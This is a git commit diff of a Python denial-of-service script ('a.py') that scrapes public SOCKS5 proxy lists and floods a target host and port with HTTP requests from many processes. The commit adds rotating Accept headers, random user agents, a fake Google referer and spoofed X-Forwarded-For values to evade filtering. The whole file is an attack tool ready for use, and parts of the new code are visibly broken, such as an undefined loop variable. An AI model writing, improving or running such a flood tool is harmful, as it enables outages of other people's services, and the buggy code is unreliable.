21204dd7a5e76b2ffe3ba0c20d9f8ea5e12b136a
Võ Bảo <87627629+kenegdane@users.noreply.github.com>
2021-09-10 17:33:49 +0700

    Update a.py

--- a.py
+++ a.py
@@ -1,6 +1,5 @@
 import ssl
-import multiprocessing
-import threading
+import multiprocessing, threading
 import socket
 import random
 import time
@@ -8,9 +7,9 @@ import sys
 import socks # pysocks
 import requests # requests
 from fake_useragent import UserAgent # fake-useragent
- 
+
 # Init
- 
+
 targetHost = sys.argv[1]
 targetPort = int(sys.argv[2])
 threadNumber = int(sys.argv[3])
@@ -35,9 +34,27 @@ proxyResources = [
     'https://www.proxy-list.download/api/v1/get?type=socks5',
     'https://www.proxyscan.io/download?type=socks5',
 ]
- 
-connectProxyHeader = f"GET / HTTP/1.1\r\nHost: {targetHost}\r\n\r\n"
- 
+
+AcceptHeaders = [
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+        "Accept-Encoding: gzip, deflate\r\n",
+        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
+        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+        "Accept: text/html, application/xhtml+xml",
+        "Accept-Language: en-US,en;q=0.5\r\n",
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
+]
+
+connectProxyHeader = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(targetHost)
+
 def socksCrawler():
     global socksFile, socksResources
     f = open(proxyFile, "wb")
@@ -47,8 +64,8 @@ def socksCrawler():
         except:
             pass
     f.close()
- 
- 
+
+
 def connectProxy(proxy):
     global liveProxies
     proxySplit = proxy.strip().split(":")
@@ -80,7 +97,9 @@ def checkProxies():
     for proxy in proxies:
         f.write(proxy)
     f.close()
+
 time.sleep(1)
+
 def Flood(indexPicker):
     if indexPicker < len(proxies):
         proxy = proxies[indexPicker].strip().split(":")
@@ -90,10 +109,11 @@ def Flood(indexPicker):
         userAgent = userAgentList[indexPicker]
     else:
         userAgent = rC(userAgentList)
-    Connection = "Connection: null\r\n"
-    Referer = "Referer: null\r\n"
+    Connection = "Connection: Keep-Alive\r\n"
+    Accept = "Accept: */*\r\n"
+    Referer = "Referer: https://google.com?q=" + targetHost + "\r\n"
     X_Forwarded_For = f"X-Forwarded-For: {proxy[0]}, {proxy[0][::-1]}\r\n"
-    User_Agent = "User-Agent: null\r\n\r\n"
+    User_Agent = "User-Agent: " + userAgent + "\r\n\r\n"
     while True:
         try:
             socks.setdefaultproxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
@@ -113,19 +133,19 @@ def Flood(indexPicker):
             except:
                 time.sleep(.1)
         except:
-            pass
- 
+            s.close()
+
 if "--socksCrawler" in sys.argv:
     socksCrawler()
 else:
     pass
- 
+
 if "--useMyFile" in sys.argv:
     proxyFile = input("Your file: ")
     proxies = open(proxyFile).readlines()
 else:
     proxies = open("socks5.txt").readlines()
- 
+
 if "--checkProxies" in sys.argv:
     proxies = open(proxyFile).readlines()
     checkProxies()
@@ -135,10 +155,9 @@ userAgentList = []
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
-def Attack():
-    for indexPicker in range(threadNumber):
-        process = multiprocessing.Process(target=Flood, args=(indexPicker, ))
-        process.setDaemon = False
-        process.start()
-Attack()
-sleep(1)
+def StartAttack():
+    for _ in range(threadNumber):
+        thread = multiprocessing.Process(target=Flood, args=(indexPicker, ))
+        thread.setDaemon = False
+        thread.start()
+StartAttack()
